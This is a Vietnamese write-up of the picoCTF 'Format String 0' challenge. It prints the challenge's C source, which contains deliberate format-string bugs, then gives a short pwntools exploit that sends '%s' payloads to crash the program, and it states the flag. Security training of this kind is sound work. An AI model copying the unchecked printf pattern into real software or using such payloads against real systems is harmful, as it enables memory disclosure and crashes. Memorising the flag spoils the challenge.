# Format String 0
Với tên đề bài thì ta có thể đoán được đây sẽ là một bài khai thác lỗ hổng [format-string](https://owasp.org/www-community/attacks/Format_string_attack).

Đầu tiên ta mở challenge ra, thấy có file nhị phân `format-string-0` và file .c `format-string-0.c`
Chạy thử file nhị phân thì ta thấy:

![image](https://github.com/user-attachments/assets/06711bf9-3b90-472e-9d90-1215970076e7)

Có vẻ như đây là một chương trình yêu cầu khách hàng lựa chọn menu ở quán burger mới mở tại `Pico 'n Patty`.

Sau đó ta xem file .c
``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```

Quan sát thì ta thấy có hàm `sigsegv_handler` sẽ in `flag`

``` c
void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}
```

Nhìn xuống hàm main(), ta thấy dòng 

``` c
signal(SIGSEGV, sigsegv_handler);
```

Dòng này cho ta biết rằng khi chương trình nhận tín hiệu SIGSEGV, thay vì dừng ngay lập tức, chương trình sẽ gọi hàm `sigsegv_handler`.

$->$ Được rồi, giờ mục tiêu của chúng ta sẽ là làm cho chương trình nhận tín hiệu SIGSEGV. 

Quay lại với hoạt động của chương trình. Đầu tiên hàm `serve_patrick()` sẽ được gọi. Và ta để ý dòng code:

``` c
int count = printf(choice1);
if (count > 2 * BUFSIZE) {
    serve_bob();
}
```

Ta thấy rằng ở đây có một lỗi `format-string` và nếu độ dài được in ra lớn hơn 64 ( $64 = 2 \times 32 $) thì hàm `serve_bob()` sẽ được gọi.

Xuống hàm `serve_bob()` thì ta thấy:
``` c
char choice2[BUFSIZE];
scanf("%s", choice2);
char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
```

Tiếp tục, đây cũng có một lỗi `format-string` và chương trình sẽ in mảng char `choice2` ra luôn. Nhìn thực đơn được cho thì ta thấy `Cla%sic_Che%s%steak` sẽ làm cho chương trình nhận tín hiện SIGSEGV (Lấy flag) bởi vì:
- Trong chuỗi có 3 đoạn format specifier `%s`, 3 đoạn này sẽ lấy 3 địa chỉ con trỏ kiểu `char*` từ stack rồi in ra chuỗi ký tự bắt đầu từ địa chỉ đó, đến khi gặp ký tự kết thúc chuỗi `\0`. 
- Nếu không có tham số truyền kèm, `printf` sẽ lấy giá trị ngẫu nhiên trên stack làm địa chỉ. Và địa chỉ ngẫu nhiên này thường **không hợp lệ**.
- Khi `printf` cố gắng đọc tại địa chỉ này, chương trình sẽ nhận tín hiệu SIGSEGV và hàm `sigsegv_handler` sẽ được gọi rồi in ra flag.

Từ những phân tích trên, ta có file exploit như sau:
``` python 
from pwn import*
p = process("format-string-0")
#p = remote('mimas.picoctf.net', 53531)
payload1 = "Gr%114d_Cheese"
payload2 = "Cla%sic_Che%s%steak"
p.sendline (payload1)
p.sendline (payload2)
p.interactive()
```

Và ta có được flag.

![image](https://github.com/user-attachments/assets/eaa243cb-52a9-4d5f-9c0c-adb755645a59)

Flag: picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
